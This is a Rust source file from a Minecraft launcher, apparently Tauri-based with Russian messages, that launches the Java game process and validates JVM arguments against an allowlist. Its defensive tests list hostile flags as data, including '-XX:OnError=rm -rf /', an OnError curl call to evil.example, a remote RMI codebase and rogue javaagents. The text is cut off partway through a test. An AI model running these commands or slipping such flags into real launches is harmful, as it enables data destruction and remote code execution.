use anyhow::Result;
use serde::Serialize;
use std::collections::VecDeque;
use std::io::{BufRead, BufReader, Read};
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering as AtomicOrdering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, Instant};
use std::{
    process::{Command, Stdio},
    thread,
};
use tauri::{AppHandle, Emitter};

use crate::utils::errors::LauncherError;
use crate::utils::get_classpath_separator;
use crate::utils::logger_utils::send_game_output;
use crate::{log_err, log_info, minecraft::structs::GameConfig};

const WINDOW_OPEN_MARKERS: &[&str] = &[
    "Reloading ResourceManager",
    "Sound engine started",
    "OpenAL initialized",
    "Backend library: LWJGL",
    "LWJGL Version:",
];

#[cfg(target_os = "windows")]
pub(crate) const CREATE_NO_WINDOW: u32 = 0x0800_0000;

const OUTPUT_TAIL_LIMIT: usize = 20;
const ERROR_TAIL_LINES: usize = 5;

const OUT_OF_MEMORY_MARKER: &str = "OutOfMemoryError";
const OUT_OF_MEMORY_REASON: &str =
    "Недостаточно выделенной памяти (OutOfMemoryError). Увеличьте максимум памяти в настройках игры";

const DISABLE_ATTACH_FLAG: &str = "-XX:+DisableAttachMechanism";

const SIZE_JVM_FLAGS: &[&str] = &["-Xms", "-Xmx", "-Xmn", "-Xss"];

const MODULE_VALUE_OPTIONS: &[&str] = &[
    "-p",
    "--module-path",
    "--upgrade-module-path",
    "--limit-modules",
    "--add-modules",
    "--add-opens",
    "--add-exports",
    "--add-reads",
    "--patch-module",
    "--enable-native-access",
];

const ALLOWED_XX_VALUE_KEYS: &[&str] = &[
    "MaxHeapSize",
    "MinHeapSize",
    "InitialHeapSize",
    "SoftMaxHeapSize",
    "MaxHeapFreeRatio",
    "MinHeapFreeRatio",
    "NewSize",
    "MaxNewSize",
    "NewRatio",
    "SurvivorRatio",
    "TargetSurvivorRatio",
    "MaxTenuringThreshold",
    "MetaspaceSize",
    "MaxMetaspaceSize",
    "CompressedClassSpaceSize",
    "ReservedCodeCacheSize",
    "MaxDirectMemorySize",
    "MaxRAMPercentage",
    "InitialRAMPercentage",
    "MinRAMPercentage",
    "MaxGCPauseMillis",
    "InitiatingHeapOccupancyPercent",
    "G1NewSizePercent",
    "G1MaxNewSizePercent",
    "G1HeapRegionSize",
    "G1ReservePercent",
    "G1HeapWastePercent",
    "G1MixedGCCountTarget",
    "G1MixedGCLiveThresholdPercent",
    "G1RSetUpdatingPauseTimePercent",
    "G1PeriodicGCInterval",
    "ParallelGCThreads",
    "ConcGCThreads",
    "ActiveProcessorCount",
    "CompileThreshold",
    "TrimNativeHeapInterval",
];

const ALLOWED_D_PROPERTY_KEYS: &[&str] = &[
    "file.encoding",
    "sun.jnu.encoding",
    "java.awt.headless",
    "java.io.tmpdir",
    "java.library.path",
    "java.net.preferIPv4Stack",
    "java.net.preferIPv6Addresses",
    "java.rmi.server.useCodebaseOnly",
    "jna.tmpdir",
    "org.lwjgl.system.SharedLibraryExtractPath",
    "io.netty.native.workdir",
    "sun.rmi.dgc.server.gcInterval",
    "sun.rmi.dgc.client.gcInterval",
    "user.timezone",
    "ignoreList",
    "mergeModules",
    "libraryDirectory",
    "os.name",
    "os.version",
];

const ALLOWED_D_PROPERTY_PREFIXES: &[&str] =
    &["forge.", "neoforge.", "minecraft.launcher.", "log4j2."];

fn is_size_value(value: &str) -> bool {
    let digits = value
        .strip_suffix(|c: char| matches!(c, 'k' | 'K' | 'm' | 'M' | 'g' | 'G'))
        .unwrap_or(value);
    !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
}

fn is_flag_name(name: &str) -> bool {
    name.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn is_bare_heap_dump_name(value: &str) -> bool {
    !value.is_empty() && !value.contains('/') && !value.contains('\\') && !value.contains("..")
}

fn is_allowed_jvm_arg(arg: &str) -> bool {
    if arg == "-XstartOnFirstThread" {
        return true;
    }
    if SIZE_JVM_FLAGS
        .iter()
        .any(|flag| arg.starts_with(flag) && is_size_value(&arg[flag.len()..]))
    {
        return true;
    }
    if let Some(rest) = arg
        .strip_prefix("-XX:+")
        .or_else(|| arg.strip_prefix("-XX:-"))
    {
        return is_flag_name(rest);
    }
    if let Some(rest) = arg.strip_prefix("-XX:") {
        let Some((key, value)) = rest.split_once('=') else {
            return false;
        };
        if !is_flag_name(key) {
            return false;
        }
        if key == "HeapDumpPath" {
            return is_bare_heap_dump_name(value);
        }
        return !value.is_empty() && ALLOWED_XX_VALUE_KEYS.contains(&key);
    }
    if let Some(rest) = arg.strip_prefix("-D") {
        let key = rest.split_once('=').map(|(k, _)| k).unwrap_or(rest);
        return !key.is_empty()
            && (ALLOWED_D_PROPERTY_KEYS.contains(&key)
                || ALLOWED_D_PROPERTY_PREFIXES
                    .iter()
                    .any(|prefix| key.starts_with(prefix)));
    }
    MODULE_VALUE_OPTIONS.iter().any(|option| {
        arg.strip_prefix(option)
            .is_some_and(|value| value.starts_with('=') && value.len() > 1)
    })
}

pub(crate) fn validate_jvm_args(jvm_args: &[String]) -> Result<()> {
    let mut option_value_next = false;
    for arg in jvm_args {
        if option_value_next {
            option_value_next = false;
            continue;
        }
        if MODULE_VALUE_OPTIONS.contains(&arg.as_str()) {
            option_value_next = true;
            continue;
        }
        if is_allowed_jvm_arg(arg) {
            continue;
        }
        return Err(LauncherError::GameProcess(format!(
            "В JVM-аргументах проекта указан запрещённый параметр \"{arg}\": разрешены только параметры памяти, GC-тюнинга, системные свойства из списка и модульные опции JDK. Удалите его в настройках проекта"
        ))
        .into());
    }
    Ok(())
}

fn finalize_jvm_args(
    jvm_args: Vec<String>,
    authlib_agent: Option<String>,
    disable_attach: bool,
) -> Result<Vec<String>> {
    validate_jvm_args(&jvm_args)?;
    let mut args = jvm_args;
    if let Some(agent) = authlib_agent {
        args.insert(0, agent);
    }
    if disable_attach {
        args.push(DISABLE_ATTACH_FLAG.to_string());
    }
    Ok(args)
}

fn exit_reason(last_output: &StdMutex<VecDeque<String>>) -> Option<String> {
    let log = last_output.lock().unwrap_or_else(|e| e.into_inner());
    if log.iter().any(|line| line.contains(OUT_OF_MEMORY_MARKER)) {
        return Some(OUT_OF_MEMORY_REASON.to_string());
    }
    None
}

fn panic_payload_text(payload: &(dyn std::any::Any + Send)) -> String {
    if let Some(text) = payload.downcast_ref::<&str>() {
        (*text).to_string()
    } else if let Some(text) = payload.downcast_ref::<String>() {
        text.clone()
    } else {
        "неизвестная паника".to_string()
    }
}

#[derive(Clone, Serialize)]
pub struct GameExitPayload {
    pub success: bool,
    pub code: Option<i32>,
    pub reason: Option<String>,
    pub username: String,
}

type SharedGameChild = Arc<StdMutex<std::process::Child>>;

struct RegisteredGame {
    child: SharedGameChild,
    username: String,
}

static GAME_SESSIONS: StdMutex<Vec<RegisteredGame>> = StdMutex::new(Vec::new());

pub fn game_running() -> bool {
    !GAME_SESSIONS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .is_empty()
}

pub fn game_usernames() -> Vec<String> {
    GAME_SESSIONS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .iter()
        .map(|game| game.username.clone())
        .collect()
}

pub fn ensure_session_free(username: &str) -> Result<()> {
    let taken = GAME_SESSIONS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .iter()
        .any(|game| game.username == username);
    if taken {
        return Err(LauncherError::GameProcess(format!(
            "Игра уже запущена с аккаунта {username}, завершите его сессию перед новым запуском"
        ))
        .into());
    }
    Ok(())
}

fn register_game_session(
    child: std::process::Child,
    username: &str,
) -> std::result::Result<SharedGameChild, std::process::Child> {
    let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
    if registry.iter().any(|game| game.username == username) {
        return Err(child);
    }
    let shared = Arc::new(StdMutex::new(child));
    registry.push(RegisteredGame {
        child: Arc::clone(&shared),
        username: username.to_string(),
    });
    Ok(shared)
}

fn remove_game_session(child: &SharedGameChild) {
    let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
    registry.retain(|game| !Arc::ptr_eq(&game.child, child));
}

fn mark_game_finalized(exited: &AtomicBool, child: &SharedGameChild) {
    exited.store(true, AtomicOrdering::Relaxed);
    remove_game_session(child);
}

fn kill_and_reap(child: &mut std::process::Child) {
    let _ = child.kill();
    let _ = child.wait();
}

fn terminate_session_child(child: &SharedGameChild) -> Option<String> {
    let mut guard = child.lock().unwrap_or_else(|e| e.into_inner());
    match guard.try_wait() {
        Ok(Some(_)) => {
            log_info!("Игра уже завершилась, принудительное завершение не требуется");
            None
        }
        Ok(None) => {
            let pid = guard.id();
            if let Err(e) = guard.kill() {
                return Some(format!("PID {pid}: не удалось завершить: {e}"));
            }
            log_info!("Процесс игры принудительно завершён (PID {pid})");
            None
        }
        Err(e) => Some(format!(
            "PID {}: не удалось получить статус процесса игры: {e}",
            guard.id()
        )),
    }
}

fn aggregated_kill_error(failures: &[String]) -> Result<()> {
    if failures.is_empty() {
        return Ok(());
    }
    Err(LauncherError::GameProcess(format!(
        "Не удалось завершить процесс игры: {}",
        failures.join("\n")
    ))
    .into())
}

pub fn kill_game_process() -> Result<()> {
    let children = GAME_SESSIONS
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .iter()
        .map(|game| Arc::clone(&game.child))
        .collect::<Vec<_>>();
    if children.is_empty() {
        return Err(LauncherError::InvalidInput("Игра не запущена".to_string()).into());
    }
    let mut failures: Vec<String> = Vec::new();
    for child in &children {
        if let Some(failure) = terminate_session_child(child) {
            failures.push(failure);
        }
    }
    aggregated_kill_error(&failures)
}

pub struct GameProcess {
    window_opened: Arc<AtomicBool>,
    exited: Arc<AtomicBool>,
    exit_status: Arc<StdMutex<Option<String>>>,
    last_output: Arc<StdMutex<VecDeque<String>>>,
}

impl GameProcess {
    pub fn exited_flag(&self) -> Arc<AtomicBool> {
        Arc::clone(&self.exited)
    }

    pub async fn wait_for_window(&self, timeout: Duration) -> Result<()> {
        let deadline = Instant::now() + timeout;
        loop {
            if self.window_opened.load(AtomicOrdering::Relaxed) {
                log_info!("Окно игры открыто");
                return Ok(());
            }
            if self.exited.load(AtomicOrdering::Relaxed) {
                tokio::time::sleep(Duration::from_millis(300)).await;
                let status = self
                    .exit_status
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .clone()
                    .unwrap_or_else(|| "неизвестный статус".to_string());
                let tail = self.output_tail();
                let details = if tail.is_empty() {
                    String::new()
                } else {
                    format!("\n{}", tail)
                };
                return Err(LauncherError::GameProcess(format!(
                    "Игра завершилась до открытия окна ({status}){details}"
                ))
                .into());
            }
            if Instant::now() >= deadline {
                log_info!(
                    "Окно игры не обнаружено по логам за {} сек, ожидание прекращено",
                    timeout.as_secs()
                );
                return Ok(());
            }
            tokio::time::sleep(Duration::from_millis(300)).await;
        }
    }

    fn output_tail(&self) -> String {
        let log = self.last_output.lock().unwrap_or_else(|e| e.into_inner());
        let len = log.len();
        log.iter()
            .skip(len.saturating_sub(ERROR_TAIL_LINES))
            .cloned()
            .collect::<Vec<String>>()
            .join("\n")
    }

    pub fn has_exited(&self) -> bool {
        self.exited.load(AtomicOrdering::Relaxed)
    }

    pub fn window_opened(&self) -> bool {
        self.window_opened.load(AtomicOrdering::Relaxed)
    }
}

fn is_window_open_marker(line: &str) -> bool {
    WINDOW_OPEN_MARKERS
        .iter()
        .any(|marker| line.contains(marker))
}

fn track_output(last_output: &StdMutex<VecDeque<String>>, line: &str) {
    let truncated: String = line.chars().take(300).collect();
    let mut log = last_output.lock().unwrap_or_else(|e| e.into_inner());
    if log.len() >= OUTPUT_TAIL_LIMIT {
        log.pop_front();
    }
    log.push_back(truncated);
}

fn spawn_output_reader(
    stream: impl Read + Send + 'static,
    last_output: Arc<StdMutex<VecDeque<String>>>,
    window_opened: Arc<AtomicBool>,
    is_error: bool,
    username: String,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut reader = BufReader::new(stream);
        let mut buffer = Vec::new();
        loop {
            buffer.clear();
            match reader.read_until(b'\n', &mut buffer) {
                Ok(0) => break,
                Ok(_) => {}
                Err(_) if buffer.is_empty() => break,
                Err(_) => {}
            }
            let lossy = String::from_utf8_lossy(&buffer);
            let line = lossy.trim_end_matches(['\r', '\n']);
            send_game_output(format!("[MC|{username}] {line}"), is_error, &username);
            track_output(&last_output, line);
            if !window_opened.load(AtomicOrdering::Relaxed) && is_window_open_marker(line) {
                log_info!("Обнаружено открытие окна игры ({username})");
                window_opened.store(true, AtomicOrdering::Relaxed);
            }
        }
    })
}

pub fn find_authlib_jar(game_dir: &Path) -> Option<PathBuf> {
    let jar = game_dir.join("authlib-injector.jar");
    if jar.exists() {
        log_info!("Найден authlib-injector: authlib-injector.jar");
        Some(jar)
    } else {
        None
    }
}

pub fn spawn_game_process(
    app: AppHandle,
    config: GameConfig,
    server_url: Option<&str>,
    username: String,
) -> Result<GameProcess> {
    log_info!("\nЗапуск Minecraft...");
    log_info!("Main class: {}", &config.main_class);
    log_info!("Java: {:?}", &config.java_path);
    log_info!("Classpath entries: {}", config.classpath.len());

    if !config.java_path.exists() {
        log_err!("Java не найдена: {:?}", config.java_path);
        return Err(
            LauncherError::Java(format!("Файл Java не найден: {:?}", config.java_path)).into(),
        );
    }

    let mut command = Command::new(&config.java_path);
    let separator = get_classpath_separator();
    let classpath = &config.classpath.join(separator);
    let jvm_args: Vec<String> = config
        .jvm_args
        .iter()
        .filter(|&arg| !arg.is_empty())
        .cloned()
        .collect();

    let authlib_agent = match (server_url, find_authlib_jar(&config.game_dir)) {
        (Some(server_url), Some(authlib_path)) => {
            let agent_arg = format!(
                "-javaagent:{}={}",
                authlib_path.to_string_lossy(),
                server_url
            );
            log_info!("Authlib-injector: {}", agent_arg);
            Some(agent_arg)
        }
        _ => None,
    };
    let jvm_args = finalize_jvm_args(jvm_args, authlib_agent, !cfg!(debug_assertions))?;

    let classpath_preview = config
        .classpath
        .iter()
        .take(3)
        .cloned()
        .collect::<Vec<_>>()
        .join(separator);
    log_info!(
        "Classpath: {} записей, первые: {classpath_preview}",
        config.classpath.len()
    );
    log_info!("{}", jvm_args.join(" "));
    command
        .args(jvm_args)
        .arg("-cp")
        .arg(classpath)
        .arg(&config.main_class)
        .args(config.game_args)
        .current_dir(&config.game_dir)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    #[cfg(target_os = "windows")]
    {
        command.creation_flags(CREATE_NO_WINDOW);
    }

    let mut child = command.spawn().map_err(|e| {
        LauncherError::GameProcess(format!("Не удалось запустить Java процесс: {e:#}"))
    })?;
    let Some(stdout) = child.stdout.take() else {
        kill_and_reap(&mut child);
        return Err(
            LauncherError::GameProcess("Не удалось получить stdout процесса".to_string()).into(),
        );
    };
    let Some(stderr) = child.stderr.take() else {
        kill_and_reap(&mut child);
        return Err(
            LauncherError::GameProcess("Не удалось получить stderr процесса".to_string()).into(),
        );
    };
    let shared_child = match register_game_session(child, &username) {
        Ok(shared) => shared,
        Err(mut orphan) => {
            kill_and_reap(&mut orphan);
            return Err(LauncherError::GameProcess(format!(
                "Игра уже запущена с аккаунта {username}, повторный запуск невозможен"
            ))
            .into());
        }
    };

    let process = GameProcess {
        window_opened: Arc::new(AtomicBool::new(false)),
        exited: Arc::new(AtomicBool::new(false)),
        exit_status: Arc::new(StdMutex::new(None)),
        last_output: Arc::new(StdMutex::new(VecDeque::new())),
    };

    let stdout_reader = spawn_output_reader(
        stdout,
        Arc::clone(&process.last_output),
        Arc::clone(&process.window_opened),
        false,
        username.clone(),
    );

    let stderr_reader = spawn_output_reader(
        stderr,
        Arc::clone(&process.last_output),
        Arc::clone(&process.window_opened),
        true,
        username.clone(),
    );

    let exited = Arc::clone(&process.exited);
    let exit_status = Arc::clone(&process.exit_status);
    let last_output = Arc::clone(&process.last_output);
    let exit_username = username.clone();
    thread::spawn(move || {
        let mut panic_guard = GameExitPanicGuard {
            app: app.clone(),
            exited: Arc::clone(&exited),
            child: Arc::clone(&shared_child),
            username: exit_username.clone(),
            armed: true,
        };
        let status = loop {
            let outcome = {
                let mut child = shared_child.lock().unwrap_or_else(|e| e.into_inner());
                child.try_wait()
            };
            match outcome {
                Ok(Some(status)) => break Ok(status),
                Ok(None) => {}
                Err(e) => break Err(e),
            }
            thread::sleep(Duration::from_millis(100));
        };
        let (result, payload) = match status {
            Ok(status) => {
                if let Err(payload) = stdout_reader.join() {
                    log_err!(
                        "Поток чтения stdout игры ({}) прерван: {}",
                        exit_username,
                        panic_payload_text(payload.as_ref())
                    );
                }
                if let Err(payload) = stderr_reader.join() {
                    log_err!(
                        "Поток чтения stderr игры ({}) прерван: {}",
                        exit_username,
                        panic_payload_text(payload.as_ref())
                    );
                }
                log_info!("Minecraft завершился ({}): {:?}", exit_username, status);
                let reason = if status.success() {
                    None
                } else {
                    exit_reason(&last_output)
                };
                let payload = GameExitPayload {
                    success: status.success(),
                    code: status.code(),
                    reason,
                    username: exit_username.clone(),
                };
                (Some(status.to_string()), payload)
            }
            Err(e) => {
                log_err!("Ошибка ожидания процесса: {}", e);
                (
                    Some(format!("ошибка ожидания: {}", e)),
                    GameExitPayload {
                        success: false,
                        code: None,
                        reason: None,
                        username: exit_username.clone(),
                    },
                )
            }
        };
        *exit_status.lock().unwrap_or_else(|e| e.into_inner()) = result;
        exited.store(true, AtomicOrdering::Relaxed);
        remove_game_session(&shared_child);
        if let Err(e) = app.emit("game-exit", payload) {
            log_err!(
                "Не удалось отправить событие game-exit ({}): {}",
                exit_username,
                e
            );
        }
        after_game_exit(&app, &exit_username);
        panic_guard.disarm();
    });

    Ok(process)
}

fn after_game_exit(app: &AppHandle, username: &str) {
    crate::tray::remove_game_session(app, username);
    if !game_running() {
        tauri::async_runtime::spawn(crate::discord::on_game_exit());
    }
}

struct GameExitPanicGuard {
    app: AppHandle,
    exited: Arc<AtomicBool>,
    child: SharedGameChild,
    username: String,
    armed: bool,
}

impl GameExitPanicGuard {
    fn disarm(&mut self) {
        self.armed = false;
    }
}

impl Drop for GameExitPanicGuard {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        log_err!("Поток ожидания игры прерван, принудительная очистка состояния игры");
        mark_game_finalized(&self.exited, &self.child);
        if let Err(e) = self.app.emit(
            "game-exit",
            GameExitPayload {
                success: false,
                code: None,
                reason: None,
                username: self.username.clone(),
            },
        ) {
            log_err!(
                "Не удалось отправить game-exit после сбоя потока ожидания ({}): {}",
                self.username,
                e
            );
        }
        after_game_exit(&self.app, &self.username);
    }
}

#[cfg(test)]
mod jvm_args_guard_tests {
    use super::{finalize_jvm_args, validate_jvm_args, DISABLE_ATTACH_FLAG};

    fn validation_error(args: &[&str]) -> String {
        let args: Vec<String> = args.iter().map(|arg| arg.to_string()).collect();
        validate_jvm_args(&args)
            .expect_err("запрещённый аргумент должен прервать запуск")
            .to_string()
    }

    #[test]
    fn blocks_debug_jmx_and_agent_flags() {
        for arg in [
            "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n",
            "-agentlib:jdwp",
            "-agentlib:hang",
            "-agentpath:/tools/libagent.so=opt",
            "-javaagent:/tools/evil.jar",
            "-Xrunjdwp",
            "-Xrunjdwp:transport=dt_socket,server=y",
            "-Xdebug",
            "-Dcom.sun.management.jmxremote",
            "-Dcom.sun.management.jmxremote.port=1616",
            "-Dcom.sun.management.jmxremote.authenticate=false",
        ] {
            let message = validation_error(&[arg]);
            assert!(
                message.contains(arg),
                "ошибка должна называть аргумент {arg}: {message}"
            );
        }
    }

    #[test]
    fn blocks_command_execution_and_classpath_escape_flags() {
        for arg in [
            "-XX:OnError=rm -rf /",
            "-XX:OnError=",
            "-XX:OnOutOfMemoryError=shutdown /s",
            "-Xbootclasspath/a:/tools/evil.jar",
            "-Xbootclasspath/p:/tools/evil.jar",
            "-XX:CompileCommandFile=/tmp/commands.txt",
            "-XX:VMOptionsFile=/tmp/options",
            "-XX:Flags=/tmp/flags",
            "-XX:StartFlightRecording=filename=/tmp/rec.jfr",
            "-XX:HeapDumpPath=/etc/cron.d/pwn",
            "-XX:HeapDumpPath=../../escape.dump",
            "-Djavax.net.ssl.trustStore=/tools/evil.jks",
            "-Djavax.net.ssl.trustStorePassword=secret",
            "-Djava.security.manager=EvilManager",
            "-Djava.rmi.server.codebase=http://evil.example/",
            "-Djava.system.class.loader=EvilLoader",
            "-DsocksProxyHost=evil.example",
            "-jar",
            "/tools/evil.jar",
            "-Xverify:none",
            "-ea:cpw.mods.modlauncher...",
        ] {
            let message = validation_error(&[arg]);
            assert!(
                message.contains(arg),
                "ошибка должна называть аргумент {arg}: {message}"
            );
        }
    }

    #[test]
    fn names_forbidden_flag_from_mixed_list() {
        let message = validation_error(&[
            "-Xmx4G",
            "-XX:+UseG1GC",
            "-javaagent:evil.jar",
            "-Dfile.encoding=UTF-8",
        ]);

        assert!(
            message.contains("-javaagent:evil.jar"),
            "ошибка должна назвать запрещённый аргумент из списка: {message}"
        );
    }

    #[test]
    fn allows_standard_args_and_presets() {
        let args: Vec<String> = [
            "-XX:+UseG1GC",
            "-XX:+ParallelRefProcEnabled",
            "-XX:MaxGCPauseMillis=200",
            "-XX:+UnlockExperimentalVMOptions",
            "-XX:+DisableExplicitGC",
            "-XX:G1NewSizePercent=30",
            "-XX:G1MaxNewSizePercent=40",
            "-XX:G1HeapRegionSize=8M",
            "-XX:G1ReservePercent=20",
            "-XX:G1HeapWastePercent=5",
            "-XX:G1MixedGCCountTarget=4",
            "-XX:InitiatingHeapOccupancyPercent=15",
            "-XX:G1MixedGCLiveThresholdPercent=90",
            "-XX:G1RSetUpdatingPauseTimePercent=5",
            "-XX:SurvivorRatio=32",
            "-XX:+PerfDisableSharedMem",
            "-XX:MaxTenuringThreshold=1",
            "-XX:-DisableAttachMechanism",
            "-XX:+DisableAttachMechanism",
            "-XX:+UseSerialGC",
            "-XX:+UseZGC",
            "-XX:+UseStringDeduplication",
            "-XX:+AlwaysPreTouch",
            "-XX:TrimNativeHeapInterval=5000",
            "-Xms512M",
            "-Xmx4G",
            "-Xss1M",
            "-Xmn256m",
            "-XstartOnFirstThread",
            "-Dfile.encoding=UTF-8",
            "-Dsun.rmi.dgc.server.gcInterval=2147483646",
            "-Dsun.rmi.dgc.client.gcInterval=2147483646",
            "-Djava.library.path=/game/natives",
            "-Djava.io.tmpdir=/game/natives",
            "-Djna.tmpdir=/game/natives",
            "-Dorg.lwjgl.system.SharedLibraryExtractPath=/game/natives",
            "-Dio.netty.native.workdir=/game",
            "-Djava.awt.headless",
            "-Duser.timezone=Europe/Moscow",
            "-Djava.rmi.server.useCodebaseOnly=true",
            "-XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.game.minecraft.exe.heapdump",
            "-XX:+HeapDumpOnOutOfMemoryError",
            "-XX:MaxMetaspaceSize=1G",
            "-XX:MetaspaceSize=512M",
            "-XX:CompressedClassSpaceSize=256M",
            "-XX:ReservedCodeCacheSize=512M",
            "-XX:MaxDirectMemorySize=2G",
            "-XX:MaxRAMPercentage=80.0",
            "-XX:ParallelGCThreads=4",
            "-XX:ConcGCThreads=2",
            "-XX:ActiveProcessorCount=4",
        ]
        .iter()
        .map(|arg| arg.to_string())
        .collect();

        validate_jvm_args(&args).expect("штатные аргументы пресетов не должны запрещаться");
    }

    #[test]
    fn allows_mojang_manifest_os_properties() {
        let args: Vec<String> = ["-Dos.name=Windows 10", "-Dos.version=10.0"]
            .iter()
            .map(|arg| arg.to_string())
            .collect();

        validate_jvm_args(&args).expect("os-свойства манифеста Mojang не должны запрещаться");
    }

    #[test]
    fn allows_loader_and_manifest_property_args() {
        let args: Vec<String> = [
            "-Djava.net.preferIPv6Addresses=system",
            "-Djava.net.preferIPv4Stack=false",
            "-DignoreList=bootstraplauncher,securejarhandler,client-extra,1.20.4.jar",
            "-DmergeModules=jna-5.10.0.jar,jna-platform-5.10.0.jar",
            "-DlibraryDirectory=/game/libraries",
            "-Dforge.enabledGameTestNamespaces=demo",
            "-Dneoforge.enabledGameTestNamespaces=demo",
            "-Dforge.forceNoTrace=true",
            "-Dlog4j2.formatMsgNoLookups=true",
            "-Dminecraft.launcher.brand=Limacina",
            "-Dminecraft.launcher.version=1.20.4",
            "--add-modules=jdk.incubator.vector",
            "--enable-native-access=ALL-UNNAMED",
        ]
        .iter()
        .map(|arg| arg.to_string())
        .collect();

        validate_jvm_args(&args).expect("аргументы лоадеров и манифестов не должны запрещаться");
    }

    #[test]
    fn module_path_value_token_is_skipped() {
        let args: Vec<String> = [
            "-p",
            "/game/libraries/cpw/mods/securejarhandler/2.1.24/securejarhandler-2.1.24.jar:/game/libraries/org/ow2/asm/asm/9.5/asm-9.5.jar",
            "--add-opens",
            "java.base/java.lang=ALL-UNNAMED",
            "--module-path=/game/libraries",
            "-Xmx4G",
        ]
        .iter()
        .map(|arg| arg.to_string())
        .collect();

        validate_jvm_args(&args).expect("значение module-path — путь, а не опция");
    }

    #[test]
    fn server_config_with_dangerous_arg_aborts_launch() {
        let server_args: Vec<String> = [
            "-Xms512M",
            "-Xmx4G",
            "-Dfile.encoding=UTF-8",
            "-XX:+UseG1GC",
            "-XX:OnError=curl http://evil.example",
        ]
        .iter()
        .map(|arg| arg.to_string())
        .collect();

        let error = finalize_jvm_args(server_args, None, true)
            .expect_err("опасный аргумент из серверного конфига должен отклонять запуск");

        assert!(
            error
                .to_string()
                .contains("-XX:OnError=curl http://evil.example"),
            "ошибка должна называть опасный аргумент: {error}"
        );

        let safe_args: Vec<String> = [
            "-Xms512M",
            "-Xmx4G",
            "-Dfile.encoding=UTF-8",
            "-XX:+UseG1GC",
        ]
        .iter()
        .map(|arg| arg.to_string())
        .collect();
        finalize_jvm_args(safe_args, None, true).expect("безопасный серверный конфиг запускается");
    }

    #[test]
    fn launcher_authlib_agent_passes_after_validation() {
        let agent = "-javaagent:/game/authlib-injector.jar=https://server.example".to_string();

        let args = finalize_jvm_args(vec!["-Xmx4G".to_string()], Some(agent.clone()), false)
            .expect("агент лаунчера не должен блокироваться");

        assert_eq!(args[0], agent);
        assert_eq!(args[1], "-Xmx4G");
    }

    #[test]
    fn forbidden_user_arg_aborts_even_with_authlib() {
        let agent = "-javaagent:/game/authlib-injector.jar=https://server.example".to_string();

        let error = finalize_jvm_args(vec!["-Xdebug".to_string()], Some(agent), true)
            .expect_err("запрещённый аргумент должен прервать запуск до вставки агента");

        assert!(
            error.to_string().contains("-Xdebug"),
            "ошибка должна называть аргумент пользователя: {error}"
        );
    }

    #[test]
    fn disable_attach_flag_stands_last_and_overrides_user_opt_out() {
        let args = finalize_jvm_args(
            vec![
                "-Xmx4G".to_string(),
                "-XX:-DisableAttachMechanism".to_string(),
            ],
            None,
            true,
        )
        .expect("аргументы должны собраться без ошибок");

        assert_eq!(
            args.last().map(String::as_str),
            Some(DISABLE_ATTACH_FLAG),
            "флаг должен стоять последним jvm-аргументом: {args:?}"
        );
        let opt_out = args
            .iter()
            .position(|arg| arg == "-XX:-DisableAttachMechanism")
            .expect("попытка отключения из пользовательских аргументов должна сохраниться");
        let opt_in = args
            .iter()
            .position(|arg| arg == DISABLE_ATTACH_FLAG)
            .expect("флаг должен быть добавлен");
        assert!(
            opt_out < opt_in,
            "последнее вхождение булевого -XX флага побеждает: {args:?}"
        );
    }

    #[test]
    fn disable_attach_flag_is_not_added_when_disabled() {
        let args = finalize_jvm_args(vec!["-Xmx4G".to_string()], None, false)
            .expect("аргументы должны собраться без ошибок");

        assert_eq!(args, vec!["-Xmx4G".to_string()]);
    }
}

#[cfg(test)]
mod exit_reason_tests {
    use super::exit_reason;
    use std::collections::VecDeque;
    use std::sync::Mutex;

    fn buffer(lines: &[&str]) -> Mutex<VecDeque<String>> {
        Mutex::new(lines.iter().map(|line| line.to_string()).collect())
    }

    #[test]
    fn exit_reason_flags_out_of_memory_with_hint() {
        let log = buffer(&[
            "[15:55:17] [Worker-Main-12/WARN]: Worker-Main-12 died",
            "java.lang.OutOfMemoryError: Java heap space",
        ]);

        let reason = exit_reason(&log).expect("причина должна быть определена");

        assert!(
            reason.contains("памяти"),
            "причина должна указывать на память: {reason}"
        );
        assert!(
            reason.contains("настройках игры"),
            "причина должна содержать подсказку про настройки: {reason}"
        );
    }

    #[test]
    fn exit_reason_flags_uncaught_handler_marker() {
        let log = buffer(&[
            "Exception: java.lang.OutOfMemoryError thrown from the UncaughtExceptionHandler in thread \"IO-Worker-1\"",
        ]);

        assert!(exit_reason(&log).is_some());
    }

    #[test]
    fn exit_reason_none_for_unclassified_crash() {
        let log = buffer(&[
            "Exception in thread \"main\" java.lang.RuntimeException: unexpected exit",
            "\tat knot/net.minecraft.client.main.Main.main(Main.java:154)",
        ]);

        assert!(exit_reason(&log).is_none());
    }

    #[test]
    fn exit_reason_none_for_empty_output() {
        let log = buffer(&[]);

        assert!(exit_reason(&log).is_none());
    }
}

#[cfg(test)]
mod spawn_output_reader_tests {
    use super::spawn_output_reader;
    use std::collections::VecDeque;
    use std::io::Cursor;
    use std::sync::atomic::{AtomicBool, Ordering as AtomicOrdering};
    use std::sync::{Arc, Mutex};

    const CP1251_CYRILLIC: &[u8] = &[0xCF, 0xF0, 0xE8, 0xE2, 0xE5, 0xF2];

    fn run_reader(bytes: Vec<u8>) -> (Arc<Mutex<VecDeque<String>>>, Arc<AtomicBool>) {
        let last_output = Arc::new(Mutex::new(VecDeque::new()));
        let window_opened = Arc::new(AtomicBool::new(false));
        let handle = spawn_output_reader(
            Cursor::new(bytes),
            Arc::clone(&last_output),
            Arc::clone(&window_opened),
            false,
            "Steve".to_string(),
        );
        handle
            .join()
